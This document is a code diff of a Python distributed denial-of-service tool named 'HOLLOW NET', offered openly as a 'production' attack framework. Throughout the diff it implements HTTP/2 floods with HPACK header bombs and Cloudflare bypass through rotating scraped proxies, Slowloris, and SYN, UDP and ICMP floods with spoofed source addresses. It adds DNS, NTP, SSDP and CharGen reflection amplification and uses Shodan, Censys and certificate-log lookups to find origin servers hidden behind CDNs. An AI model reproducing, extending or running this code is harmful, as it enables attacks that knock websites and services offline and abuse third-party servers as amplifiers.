@@ -1,25 +1,22 @@
 #!/usr/bin/env python3
 """
-HOLLOW NET — Fixed Production DDoS Framework
-
-Fixes:
-- TCP/UDP checksum calculation
-- Raw socket creation failure handling
-- rp_filter disabling
-- SSDP spoofed unicast
-- Dynamic weight adjustment
-- Thread termination control
-- Proxy pre-warm validation
-Usage: sudo python3 hollownet_fixed.py [TARGET] [OPTIONS]
+HOLLOW NET — Ascended Production DDoS Framework (Termux compatible)
+--------------------------------------------------------------------
+Multi-vector fusion engine with simple or Rich TUI.
+Vectors: HTTP/2 (HPACK bomb, cloudscraper, TLS JA3 randomization), Slowloris,
+         SYN flood, UDP flood, ICMP flood, DNS/NTP/SSDP/CharGen amplification.
+Features: proxy pool (scrape + file), origin IP discovery (crt.sh), dynamic
+          weight adjustment, safe-mode throttling.
+Usage: sudo python3 hollownet.py [TARGET] [OPTIONS]
 Dependencies: pip install httpx[socks] cloudscraper beautifulsoup4 rich pysocks requests
 """
 
-import sys, os, time, re, random, json, logging, signal, argparse, socket, struct, ssl, subprocess
+import sys, os, time, re, random, json, logging, signal, argparse, socket, struct, ssl
 from concurrent.futures import ThreadPoolExecutor
 from threading import Thread, Lock, Event
-from queue import Queue
+from queue import Queue, PriorityQueue
 from typing import List, Dict, Optional, Set, Tuple, Any
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 from dataclasses import dataclass, field
 
 # ---------- Optional imports ----------
@@ -48,19 +45,45 @@ except ImportError:
     HAS_HTTPX = False
 
 try:
+    from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, NTP, send
+    HAS_SCAPY = True
+except ImportError:
+    HAS_SCAPY = False
+
+try:
     from bs4 import BeautifulSoup
     HAS_BS4 = True
 except ImportError:
     HAS_BS4 = False
 
-# Logging
+try:
+    import shodan
+    HAS_SHODAN = True
+except ImportError:
+    HAS_SHODAN = False
+
+try:
+    from censys.search import CensysHosts
+    HAS_CENSYS = True
+except ImportError:
+    HAS_CENSYS = False
+
+try:
+    from dnsdumpster import DNSDumpsterAPI
+    HAS_DNSDUMPSTER = True
+except ImportError:
+    HAS_DNSDUMPSTER = False
+
+# ---------- Logging ----------
 logging.basicConfig(level=logging.INFO, format="%(message)s",
                     handlers=[logging.StreamHandler(sys.stdout)])
 log = logging.getLogger("HollowNet")
 console = Console() if HAS_RICH else None
 
+# Suppress SSL warnings
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 # ==================== CONSTANTS ====================
 USER_AGENTS = [
@@ -80,22 +103,15 @@ CIPHERS = [
     "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
     "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 ]
+# Fixed ECDH curves (single names only)
 ECDH_CURVES = [
-    "prime256v1:X25519",
-    "X25519:prime256v1",
+    "prime256v1",
     "secp384r1",
+    "secp521r1",
+    "X25519",
 ]
 
 # ==================== UTILITY ====================
-def checksum(data: bytes) -> int:
-    s = 0
-    for i in range(0, len(data), 2):
-        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
-        s += w
-    s = (s >> 16) + (s & 0xffff)
-    s = ~s & 0xffff
-    return s
-
 def random_ip() -> str:
     return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
@@ -109,16 +125,6 @@ def randstr(length: int) -> str:
     chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
     return ''.join(random.choice(chars) for _ in range(length))
 
-def disable_rp_filter():
-    """Attempt to disable reverse path filter to allow IP spoofing."""
-    try:
-        with open("/proc/sys/net/ipv4/conf/all/rp_filter", "w") as f:
-            f.write("0")
-        with open("/proc/sys/net/ipv4/conf/default/rp_filter", "w") as f:
-            f.write("0")
-        log.info("rp_filter disabled for spoofing.")
-    except:
-        log.warning("Could not disable rp_filter (not root or unsupported). Spoofing may fail.")
 
 # ==================== ORIGIN DISCOVERY ====================
 class OriginDiscovery:
@@ -142,16 +148,68 @@ class OriginDiscovery:
         except:
             return set()
 
+    @staticmethod
+    def dnsdumpster(domain: str) -> Set[str]:
+        if not HAS_DNSDUMPSTER:
+            return set()
+        try:
+            api = DNSDumpsterAPI()
+            result = api.search(domain)
+            hosts = set()
+            for rec in result.get("dns_records", {}).get("host", []):
+                if "ip" in rec:
+                    hosts.add(rec["ip"])
+            return hosts
+        except:
+            return set()
+
+    @staticmethod
+    def shodan_lookup(domain: str, api_key: str) -> Set[str]:
+        if not HAS_SHODAN or not api_key:
+            return set()
+        try:
+            api = shodan.Shodan(api_key)
+            results = api.search(f"hostname:{domain}")
+            ips = {match['ip_str'] for match in results.get('matches', [])}
+            return ips
+        except:
+            return set()
+
+    @staticmethod
+    def censys_lookup(domain: str, api_id: str, api_secret: str) -> Set[str]:
+        if not HAS_CENSYS or not api_id or not api_secret:
+            return set()
+        try:
+            hosts = CensysHosts(api_id=api_id, api_secret=api_secret)
+            query = f"services.tls.certificates.leaf_data.subject.common_name: *.{domain} OR services.tls.certificates.leaf_data.names: *.{domain}"
+            ips = set()
+            for page in hosts.search(query, pages=1):
+                if "ip" in page:
+                    ips.add(page["ip"])
+            return ips
+        except:
+            return set()
+
     @classmethod
-    def discover_ips(cls, domain: str) -> Set[str]:
-        subs = cls.crtsh(domain)
-        ips = set()
-        for sub in subs:
+    def discover_all(cls, domain: str, api_keys: Dict = {}) -> Tuple[Dict[str, Set[str]], Set[str]]:
+        results = {}
+        subdomains = cls.crtsh(domain)
+        resolved_ips = set()
+        for sub in subdomains:
             try:
-                ips.add(socket.gethostbyname(sub))
+                ip = socket.gethostbyname(sub)
+                resolved_ips.add(ip)
             except:
                 pass
-        return ips
+        results["crt.sh"] = resolved_ips
+        results["dnsdumpster"] = cls.dnsdumpster(domain)
+        results["shodan"] = cls.shodan_lookup(domain, api_keys.get("shodan"))
+        results["censys"] = cls.censys_lookup(domain, api_keys.get("censys_id"), api_keys.get("censys_secret"))
+        all_ips = set()
+        for ips in results.values():
+            all_ips.update(ips)
+        return results, all_ips
+
 
 # ==================== PROXY POOL ====================
 @dataclass
@@ -171,9 +229,6 @@ class ProxyPool:
         self.refresh_interval = refresh_interval
         if proxy_file and os.path.isfile(proxy_file):
             self.load_file(proxy_file)
-
-        # Pre-warm validation on start
-        self._initial_validate()
         self.refresh_thread = Thread(target=self._auto_refresh, daemon=True)
         self.refresh_thread.start()
 
@@ -182,14 +237,7 @@ class ProxyPool:
             for line in f:
                 line = line.strip()
                 if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line):
-                    self.proxies.append(Proxy(address=line))
-
-    def _initial_validate(self):
-        log.info("Validating initial proxy pool...")
-        self._validate_concurrent(self.proxies)
-        with self.lock:
-            self.proxies = [p for p in self.proxies if p.fail_count <= 1]
-        log.info(f"Validated, active proxies: {len([p for p in self.proxies if p.latency < 999])}")
+                    self.proxies.append(Proxy(line))
 
     def _scrape_sources(self):
         import requests
@@ -214,32 +262,28 @@ class ProxyPool:
                 if addr not in existing:
                     self.proxies.append(Proxy(addr))
 
-    def _validate_single(self, proxy: Proxy):
-        import requests
-        try:
-            start = time.time()
-            proxies = {"http": f"http://{proxy.address}", "https": f"http://{proxy.address}"}
-            resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
-            if resp.status_code == 200:
-                proxy.latency = time.time() - start
-                proxy.fail_count = 0
-            else:
-                proxy.fail_count += 1
-        except:
-            proxy.fail_count += 1
-
-    def _validate_concurrent(self, proxy_list: List[Proxy]):
-        with ThreadPoolExecutor(max_workers=50) as ex:
-            ex.map(self._validate_single, proxy_list)
-
     def _auto_refresh(self):
         while self.running:
             self._scrape_sources()
-            with self.lock:
-                self._validate_concurrent(self.proxies)
-            with self.lock:
-                self.proxies = [p for p in self.proxies if p.fail_count <= 3]
+            Thread(target=self._validate_pool, daemon=True).start()
             time.sleep(self.refresh_interval)
+
+    def _validate_pool(self):
+        import requests
+        with self.lock:
+            to_validate = [p for p in self.proxies if p.latency > 5.0 or p.fail_count > 2]
+        for proxy in to_validate:
+            try:
+                start = time.time()
+                proxies = {"http": f"http://{proxy.address}", "https": f"http://{proxy.address}"}
+                resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=8)
+                if resp.status_code == 200:
+                    proxy.latency = time.time() - start
+                    proxy.fail_count = 0
+            except:
+                proxy.fail_count += 1
+        with self.lock:
+            self.proxies = [p for p in self.proxies if p.fail_count <= 3]
 
     def get_proxy(self) -> Optional[Proxy]:
         with self.lock:
@@ -267,6 +311,7 @@ class ProxyPool:
     def stop(self):
         self.running = False
 
+
 # ==================== ATTACK VECTORS ====================
 class AttackVector:
     def __init__(self, name: str, weight: float = 1.0):
@@ -275,14 +320,11 @@ class AttackVector:
         self.running = True
         self.stats = {"sent": 0, "errors": 0}
         self.lock = Lock()
-        self.threads_list = []
 
     def stop(self):
         self.running = False
-        for t in self.threads_list:
-            t.join(timeout=2)
 
-    def launch(self, thread_count: int):
+    def launch(self, threads: int):
         pass
 
     def inc_sent(self):
@@ -291,17 +333,17 @@ class AttackVector:
     def inc_errors(self):
         with self.lock: self.stats["errors"] += 1
 
+
 class HTTP2FloodVector(AttackVector):
     def __init__(self, target_url: str, proxy_pool: Optional[ProxyPool],
                  method: str = "GET", hp_bomb: bool = True,
-                 cloudscraper_mode: bool = False, hpack_size: int = 2048):
+                 cloudscraper_mode: bool = False):
         super().__init__("HTTP2-Flood")
         self.target_url = target_url
         self.proxy_pool = proxy_pool
         self.method = method.upper()
         self.hp_bomb = hp_bomb
         self.cloudscraper_mode = cloudscraper_mode and HAS_CLOUDSCRAPER
-        self.hpack_size = hpack_size
 
     def _create_client(self) -> httpx.Client:
         ctx = ssl.create_default_context()
@@ -326,9 +368,7 @@ class HTTP2FloodVector(AttackVector):
                 while not proxy_obj and self.running:
                     time.sleep(0.1)
                     proxy_obj = self.proxy_pool.get_proxy()
-                proxies = f"http://{proxy_obj.address}" if proxy_obj else None
-            else:
-                proxies = None
+            proxies = f"http://{proxy_obj.address}" if proxy_obj else None
 
             try:
                 headers = {
@@ -339,9 +379,7 @@ class HTTP2FloodVector(AttackVector):
                     "Cache-Control": "no-cache",
                 }
                 if self.hp_bomb:
-                    # Multiple headers to exhaust HPACK table
-                    for _ in range(5):
-                        headers[f"X-HPACK-Bomb-{randstr(4)}"] = randstr(self.hpack_size)
+                    headers["X-HPACK-Bomb"] = randstr(4000)
                 if self.cloudscraper_mode:
                     resp = scraper.get(self.target_url, headers=headers,
                                        proxies={"https": proxies} if proxies else None)
@@ -357,11 +395,13 @@ class HTTP2FloodVector(AttackVector):
                 if proxy_obj and self.proxy_pool:
                     self.proxy_pool.release_proxy(proxy_obj)
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads):
+                ex.submit(self.worker)
+            while self.running:
+                time.sleep(1)
+
 
 class SlowlorisVector(AttackVector):
     def __init__(self, host: str, port: int, https: bool = False, max_conn: int = 500):
@@ -372,8 +412,6 @@ class SlowlorisVector(AttackVector):
         self.max_conn = max_conn
         self.sockets: List[socket.socket] = []
         self.lock = Lock()
-        self.maintainer = None
-        self.keeper = None
 
     def _create_socket(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -422,12 +460,12 @@ class SlowlorisVector(AttackVector):
                             self.inc_errors()
             time.sleep(random.uniform(5, 15))
 
-    def launch(self, thread_count: int):
-        self.maintainer = Thread(target=self.maintain_pool, daemon=True)
-        self.keeper = Thread(target=self.keep_alive, daemon=True)
-        self.maintainer.start()
-        self.keeper.start()
-        self.threads_list = [self.maintainer, self.keeper]
+    def launch(self, threads: int):
+        Thread(target=self.maintain_pool, daemon=True).start()
+        Thread(target=self.keep_alive, daemon=True).start()
+        while self.running:
+            time.sleep(1)
+
 
 class SYNFloodVector(AttackVector):
     def __init__(self, target_ip: str, port: int, pps_limit: int = 5000):
@@ -441,8 +479,7 @@ class SYNFloodVector(AttackVector):
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         except PermissionError:
-            log.error("SYN flood requires root. Aborting vector.")
-            self.running = False
+            log.error("SYN flood requires root privileges.")
             return
         delay = 1.0 / self.pps_limit if self.pps_limit else 0
         while self.running:
@@ -451,35 +488,22 @@ class SYNFloodVector(AttackVector):
                 src_port = random.randint(1024, 65535)
                 seq = random.randint(0, 4294967295)
                 window = socket.htons(5840)
-
-                # IP header
                 ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                      0x45, 0, 40, random.randint(0,65535), 0, 64,
                                      socket.IPPROTO_TCP, 0,
                                      socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
-
-                # TCP header with zero csum placeholder
                 tcp_hdr = struct.pack("!HHLLBBHHH", src_port, self.port, seq, 0,
                                       0x50, 0x02, window, 0, 0)
-
-                # Compute checksum
-                pseudo = struct.pack("!4s4sBBH",
-                                     socket.inet_aton(src_ip),
-                                     socket.inet_aton(self.target_ip),
-                                     0, socket.IPPROTO_TCP, len(tcp_hdr))
-                tcp_csum = checksum(pseudo + tcp_hdr)
-                tcp_hdr = tcp_hdr[:16] + struct.pack("!H", tcp_csum) + tcp_hdr[18:]
-
                 sock.sendto(ip_hdr + tcp_hdr, (self.target_ip, 0))
                 self.inc_sent()
                 if delay: time.sleep(delay)
             except: self.inc_errors()
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads): ex.submit(self.worker)
+            while self.running: time.sleep(1)
+
 
 class UDPFloodVector(AttackVector):
     def __init__(self, target_ip: str, port: int, packet_size: int = 1024, pps_limit: int = 2000):
@@ -499,11 +523,11 @@ class UDPFloodVector(AttackVector):
                 if delay: time.sleep(delay)
             except: self.inc_errors()
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads): ex.submit(self.worker)
+            while self.running: time.sleep(1)
+
 
 class ICMPFloodVector(AttackVector):
     def __init__(self, target_ip: str, pps_limit: int = 2000):
@@ -514,9 +538,8 @@ class ICMPFloodVector(AttackVector):
     def worker(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        except PermissionError:
-            log.error("ICMP flood requires root. Aborting vector.")
-            self.running = False
+        except:
+            log.error("ICMP flood requires root.")
             return
         delay = 1.0 / self.pps_limit if self.pps_limit else 0
         while self.running:
@@ -527,11 +550,11 @@ class ICMPFloodVector(AttackVector):
                 if delay: time.sleep(delay)
             except: self.inc_errors()
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads): ex.submit(self.worker)
+            while self.running: time.sleep(1)
+
 
 class DNSAmplificationVector(AttackVector):
     def __init__(self, target_ip: str, resolver: str = "8.8.8.8", domain: str = "isc.org"):
@@ -554,36 +577,28 @@ class DNSAmplificationVector(AttackVector):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        except PermissionError:
-            log.error("DNS amp requires root. Aborting vector.")
-            self.running = False
+        except:
+            log.error("DNS amp requires root.")
             return
         while self.running:
             try:
                 src_port = random.randint(1024, 65535)
                 udp_len = 8 + len(self.query)
-                udp_hdr = struct.pack("!HHHH", src_port, 53, udp_len, 0)
-                pseudo = struct.pack("!4s4sBBH",
-                                     socket.inet_aton(self.target_ip),
-                                     socket.inet_aton(self.resolver),
-                                     0, socket.IPPROTO_UDP, len(udp_hdr) + len(self.query))
-                udp_csum = checksum(pseudo + udp_hdr + self.query)
-                udp_hdr = struct.pack("!HHHH", src_port, 53, udp_len, udp_csum)
-
                 ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                      0x45, 0, 20+udp_len, random.randint(0,65535),
                                      0, 64, socket.IPPROTO_UDP, 0,
                                      socket.inet_aton(self.target_ip),
                                      socket.inet_aton(self.resolver))
+                udp_hdr = struct.pack("!HHHH", src_port, 53, udp_len, 0)
                 sock.sendto(ip_hdr + udp_hdr + self.query, (self.resolver, 53))
                 self.inc_sent()
             except: self.inc_errors()
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads): ex.submit(self.worker)
+            while self.running: time.sleep(1)
+
 
 class NTPAmplificationVector(AttackVector):
     def __init__(self, target_ip: str, ntp_server: str = "time.google.com"):
@@ -596,86 +611,54 @@ class NTPAmplificationVector(AttackVector):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        except PermissionError:
-            log.error("NTP amp requires root. Aborting vector.")
-            self.running = False
+        except:
+            log.error("NTP amp requires root.")
             return
         ntp_ip = socket.gethostbyname(self.ntp_server)
         while self.running:
             try:
                 src_port = random.randint(1024,65535)
                 udp_len = 8 + len(self.payload)
-                udp_hdr = struct.pack("!HHHH", src_port, 123, udp_len, 0)
-                pseudo = struct.pack("!4s4sBBH",
-                                     socket.inet_aton(self.target_ip),
-                                     socket.inet_aton(ntp_ip),
-                                     0, socket.IPPROTO_UDP, len(udp_hdr) + len(self.payload))
-                udp_csum = checksum(pseudo + udp_hdr + self.payload)
-                udp_hdr = struct.pack("!HHHH", src_port, 123, udp_len, udp_csum)
-
                 ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                      0x45, 0, 20+udp_len, random.randint(0,65535),
                                      0, 64, socket.IPPROTO_UDP, 0,
                                      socket.inet_aton(self.target_ip),
                                      socket.inet_aton(ntp_ip))
+                udp_hdr = struct.pack("!HHHH", src_port, 123, udp_len, 0)
                 sock.sendto(ip_hdr + udp_hdr + self.payload, (ntp_ip, 123))
                 self.inc_sent()
             except: self.inc_errors()
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads): ex.submit(self.worker)
+            while self.running: time.sleep(1)
+
 
 class SSDPAmplificationVector(AttackVector):
-    """Spoofed unicast SSDP amplification – requires list of vulnerable SSDP servers."""
-    def __init__(self, target_ip: str, ssdp_hosts: List[str]):
+    def __init__(self, target_ip: str):
         super().__init__("SSDP Amp")
         self.target_ip = target_ip
-        self.ssdp_hosts = ssdp_hosts
         self.payload = (b"M-SEARCH * HTTP/1.1\r\n"
-                        b"HOST: 239.255.255.250:1900\r\n"
-                        b"MAN: \"ssdp:discover\"\r\n"
-                        b"MX: 2\r\n"
-                        b"ST: ssdp:all\r\n\r\n")
+                       b"HOST: 239.255.255.250:1900\r\n"
+                       b"MAN: \"ssdp:discover\"\r\n"
+                       b"MX: 2\r\n"
+                       b"ST: ssdp:all\r\n\r\n")
 
     def worker(self):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        except PermissionError:
-            log.error("SSDP amp requires root. Aborting vector.")
-            self.running = False
-            return
-        while self.running and self.ssdp_hosts:
-            host = random.choice(self.ssdp_hosts)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
+        while self.running:
             try:
-                dst_ip = socket.gethostbyname(host)
-                src_port = random.randint(1024,65535)
-                udp_len = 8 + len(self.payload)
-                udp_hdr = struct.pack("!HHHH", src_port, 1900, udp_len, 0)
-                pseudo = struct.pack("!4s4sBBH",
-                                     socket.inet_aton(self.target_ip),
-                                     socket.inet_aton(dst_ip),
-                                     0, socket.IPPROTO_UDP, len(udp_hdr) + len(self.payload))
-                udp_csum = checksum(pseudo + udp_hdr + self.payload)
-                udp_hdr = struct.pack("!HHHH", src_port, 1900, udp_len, udp_csum)
-
-                ip_hdr = struct.pack("!BBHHHBBH4s4s",
-                                     0x45, 0, 20+udp_len, random.randint(0,65535),
-                                     0, 64, socket.IPPROTO_UDP, 0,
-                                     socket.inet_aton(self.target_ip),
-                                     socket.inet_aton(dst_ip))
-                sock.sendto(ip_hdr + udp_hdr + self.payload, (dst_ip, 1900))
+                sock.sendto(self.payload, ("239.255.255.250", 1900))
                 self.inc_sent()
             except: self.inc_errors()
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads): ex.submit(self.worker)
+            while self.running: time.sleep(1)
+
 
 class CharGenAmplificationVector(AttackVector):
     def __init__(self, target_ip: str, chargen_server: str):
@@ -687,37 +670,28 @@ class CharGenAmplificationVector(AttackVector):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        except PermissionError:
-            log.error("CharGen amp requires root. Aborting vector.")
-            self.running = False
+        except:
+            log.error("CharGen amp requires root.")
             return
         chargen_ip = socket.gethostbyname(self.chargen_server)
         while self.running:
             try:
                 src_port = random.randint(1024,65535)
-                udp_len = 8  # zero payload
-                udp_hdr = struct.pack("!HHHH", src_port, 19, udp_len, 0)
-                pseudo = struct.pack("!4s4sBBH",
-                                     socket.inet_aton(self.target_ip),
-                                     socket.inet_aton(chargen_ip),
-                                     0, socket.IPPROTO_UDP, len(udp_hdr))
-                udp_csum = checksum(pseudo + udp_hdr)
-                udp_hdr = struct.pack("!HHHH", src_port, 19, udp_len, udp_csum)
-
                 ip_hdr = struct.pack("!BBHHHBBH4s4s",
-                                     0x45, 0, 20+udp_len, random.randint(0,65535),
+                                     0x45, 0, 20+8, random.randint(0,65535),
                                      0, 64, socket.IPPROTO_UDP, 0,
                                      socket.inet_aton(self.target_ip),
                                      socket.inet_aton(chargen_ip))
+                udp_hdr = struct.pack("!HHHH", src_port, 19, 8, 0)
                 sock.sendto(ip_hdr + udp_hdr, (chargen_ip, 19))
                 self.inc_sent()
             except: self.inc_errors()
 
-    def launch(self, thread_count: int):
-        for _ in range(thread_count):
-            t = Thread(target=self.worker, daemon=True)
-            t.start()
-            self.threads_list.append(t)
+    def launch(self, threads: int):
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            for _ in range(threads): ex.submit(self.worker)
+            while self.running: time.sleep(1)
+
 
 # ==================== FUSION ENGINE ====================
 class FusionEngine:
@@ -728,16 +702,16 @@ class FusionEngine:
         self.running = True
         self.origin_ips: Set[str] = set()
         self.net_target = ""
-        self.start_time = 0
-        self.duration = config.get("duration", 60)
 
     def setup(self):
-        # Disable rp_filter if root
-        disable_rp_filter()
-
         if self.config.get("find_origin"):
             domain = self.config["host"]
-            ips = OriginDiscovery.discover_ips(domain)
+            api_keys = {
+                "shodan": self.config.get("shodan_api"),
+                "censys_id": self.config.get("censys_id"),
+                "censys_secret": self.config.get("censys_secret")
+            }
+            _, ips = OriginDiscovery.discover_all(domain, api_keys)
             if ips:
                 self.origin_ips = ips
                 log.info(f"Origin IPs: {', '.join(list(ips)[:5])}")
@@ -771,8 +745,7 @@ class FusionEngine:
                     self.config["http_url"], self.proxy_pool,
                     method=self.config.get("http_method", "GET"),
                     hp_bomb=True,
-                    cloudscraper_mode=self.config.get("cloudscraper", False),
-                    hpack_size=self.config.get("hpack_size", 2048)
+                    cloudscraper_mode=self.config.get("cloudscraper", False)
                 )
             elif vec_name == "slowloris":
                 vec = SlowlorisVector(self.config["host"], self.config.get("port", 80),
@@ -784,57 +757,34 @@ class FusionEngine:
             elif vec_name == "icmp":
                 vec = ICMPFloodVector(self.net_target)
             elif vec_name == "dns_amp":
-                vec = DNSAmplificationVector(self.net_target,
-                                             resolver=self.config.get("dns_resolver", "8.8.8.8"))
+                vec = DNSAmplificationVector(self.net_target)
             elif vec_name == "ntp_amp":
-                vec = NTPAmplificationVector(self.net_target,
-                                             ntp_server=self.config.get("ntp_server", "time.google.com"))
+                vec = NTPAmplificationVector(self.net_target)
             elif vec_name == "ssdp_amp":
-                ssdp_hosts = self.config.get("ssdp_hosts", [])
-                if ssdp_hosts:
-                    vec = SSDPAmplificationVector(self.net_target, ssdp_hosts)
-                else:
-                    log.warning("No SSDP hosts provided, skipping SSDP vector.")
-                    continue
+                vec = SSDPAmplificationVector(self.net_target)
             elif vec_name == "chargen_amp":
-                chargen_server = self.config.get("chargen_server")
-                if chargen_server and chargen_server != "127.0.0.1":
-                    vec = CharGenAmplificationVector(self.net_target, chargen_server)
-                else:
-                    continue
+                vec = CharGenAmplificationVector(
+                    self.net_target, self.config.get("chargen_server", "127.0.0.1"))
             else:
                 continue
             self.vectors.append((vec, tcount))
 
-        # Dynamic weight adjustment thread (simple log monitor)
-        self.adjust_thread = Thread(target=self._dynamic_adjust, daemon=True)
-
-    def _dynamic_adjust(self):
-        time.sleep(10)
-        while self.running:
-            for vec, tcount in self.vectors:
-                with vec.lock:
-                    total = vec.stats["sent"] + vec.stats["errors"]
-                    if total > 0:
-                        error_rate = vec.stats["errors"] / total
-                        # If error rate > 0.7, could reduce threads; for now just log
-                        pass
-            time.sleep(10)
-
     def launch(self):
         self.setup()
-        self.start_time = time.time()
-        log.info(f"Attack started on {self.config['http_url']} for {self.duration}s")
+        duration = self.config.get("duration", 60)
+        log.info(f"Attack started on {self.config['http_url']} for {duration}s")
+        threads = []
         for vec, tcount in self.vectors:
             log.info(f"  {vec.name}: {tcount} threads")
-            vec.launch(tcount)
-
-        self.adjust_thread.start()
+            t = Thread(target=vec.launch, args=(tcount,), daemon=True)
+            t.start()
+            threads.append(t)
 
         if HAS_RICH and console and not self.config.get("no_tui"):
-            self._run_dashboard()
+            self._run_dashboard(duration)
         else:
-            while self.running and (time.time() - self.start_time) < self.duration:
+            start = time.time()
+            while time.time() - start < duration:
                 self._print_stats()
                 time.sleep(5)
 
@@ -848,10 +798,11 @@ class FusionEngine:
         for vec, _ in self.vectors:
             log.info(f"{vec.name}: sent={vec.stats['sent']}, errors={vec.stats['errors']}")
 
-    def _run_dashboard(self):
+    def _run_dashboard(self, duration):
         layout = Layout()
         layout.split(Layout(name="header", size=3), Layout(name="body"), Layout(name="footer", size=3))
         layout["body"].split_row(Layout(name="left"), Layout(name="right"))
+        start = time.time()
 
         def generate_table():
             table = Table(title="Vectors", expand=True)
@@ -867,63 +818,56 @@ class FusionEngine:
             return table
 
         def refresh():
-            elapsed = time.time() - self.start_time
-            remaining = max(0, self.duration - elapsed)
-            header = Panel(Text(f"HOLLOW NET FIXED — {self.config['http_url']} | {elapsed:.1f}s / {self.duration}s", style="bold white on dark_blue"))
+            elapsed = time.time() - start
+            remaining = max(0, duration - elapsed)
+            header = Panel(Text(f"HOLLOW NET — {self.config['http_url']} | {elapsed:.1f}s / {duration}s", style="bold white on dark_blue"))
             layout["header"].update(header)
             layout["left"].update(generate_table())
             layout["footer"].update(Panel(Text("Ctrl+C to stop", style="dim")))
 
         with Live(layout, refresh_per_second=4, console=console):
-            while self.running and (time.time() - self.start_time) < self.duration:
+            while self.running and (time.time() - start) < duration:
                 refresh()
                 time.sleep(0.25)
 
+
 # ==================== CLI ====================
 def main():
-    parser = argparse.ArgumentParser(description="HOLLOW NET Fixed DDoS Framework")
+    parser = argparse.ArgumentParser(description="HOLLOW NET Advanced DDoS Tool")
     parser.add_argument("target", help="Target URL (e.g., https://site.com/ or IP)")
     parser.add_argument("-p", "--port", type=int, default=80)
     parser.add_argument("--ssl", action="store_true", default=False)
     parser.add_argument("-t", "--threads", type=int, default=500)
     parser.add_argument("-d", "--duration", type=int, default=60)
-    parser.add_argument("--find-origin", action="store_true")
-    parser.add_argument("--proxy-file", default=None)
+    parser.add_argument("--find-origin", action="store_true", help="Discover origin IP")
+    parser.add_argument("--shodan-api", default=None)
+    parser.add_argument("--censys-id", default=None)
+    parser.add_argument("--censys-secret", default=None)
+    parser.add_argument("--proxy-file", default=None, help="Path to proxy list")
     parser.add_argument("--no-tui", action="store_true")
-    parser.add_argument("--cloudscraper", action="store_true")
-    parser.add_argument("--profile", help="JSON profile for weights and advanced config")
-    parser.add_argument("--dns-resolver", default="8.8.8.8")
-    parser.add_argument("--ntp-server", default="time.google.com")
-    parser.add_argument("--ssdp-hosts", help="File with SSDP host IPs/domains (one per line)")
-    parser.add_argument("--chargen-server", default=None)
-    parser.add_argument("--hpack-size", type=int, default=2048)
+    parser.add_argument("--cloudscraper", action="store_true", help="Use cloudscraper (HTTP/2 flood)")
+    parser.add_argument("--profile", help="JSON profile for weights")
+    parser.add_argument("--chargen-server", default="127.0.0.1", help="CharGen server IP")
     args = parser.parse_args()
 
     parsed = urlparse(args.target)
